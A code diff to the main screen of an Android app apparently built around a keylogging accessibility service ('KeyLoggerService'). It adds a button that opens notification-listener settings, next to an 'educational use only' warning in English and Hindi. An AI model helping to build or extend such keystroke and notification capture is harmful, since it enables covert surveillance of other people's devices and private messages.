@@ -17,20 +17,20 @@ public class MainActivity extends AppCompatActivity {
 
     private TextView statusTextView;
     private Button enableButton;
+    private Button enableNotificationButton; 
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        
         setContentView(R.layout.activity_main);
-
        
         showEthicalWarning();
-
        
         statusTextView = findViewById(R.id.status_text);
         enableButton = findViewById(R.id.enable_button);
+        
+       
+        enableNotificationButton = findViewById(R.id.enable_notification_button); 
 
       
         enableButton.setOnClickListener(v -> {
@@ -39,7 +39,15 @@ public class MainActivity extends AppCompatActivity {
                 startActivity(intent);
             } catch (Exception e) {
                 e.printStackTrace();
-              
+            }
+        });
+
+        enableNotificationButton.setOnClickListener(v -> {
+            try {
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                startActivity(intent);
+            } catch (Exception e) {
+                e.printStackTrace();
             }
         });
     }
@@ -47,11 +55,12 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        
         updateServiceStatus();
+        
     }
-
     
+ 
+
     private void updateServiceStatus() {
         if (isAccessibilityServiceEnabled(this, KeyLoggerService.class)) {
             statusTextView.setText("Status: Active");
@@ -62,7 +71,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    
     public boolean isAccessibilityServiceEnabled(Context context, Class<?> service) {
         TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
         String settingValue = Settings.Secure.getString(
@@ -83,7 +91,6 @@ public class MainActivity extends AppCompatActivity {
         }
         return false;
     }
-
    
     private void showEthicalWarning() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
@@ -94,14 +101,10 @@ public class MainActivity extends AppCompatActivity {
                            "learning purposes.\n\n" +
                            "क्या आप सहमत हैं कि आप इस ऐप का उपयोग केवल शैक्षिक उद्देश्यों के लिए " +
                            "अपने स्वयं के डिवाइस पर कर रहे हैं?");
-        
         builder.setPositiveButton("Agree (मैं सहमत हूँ)", (dialog, which) -> dialog.dismiss());
-        
         builder.setNegativeButton("Disagree (असहमत हूँ)", (dialog, which) -> {
-            
             finish();
         });
-        
         builder.setCancelable(false); 
         builder.show();
     }
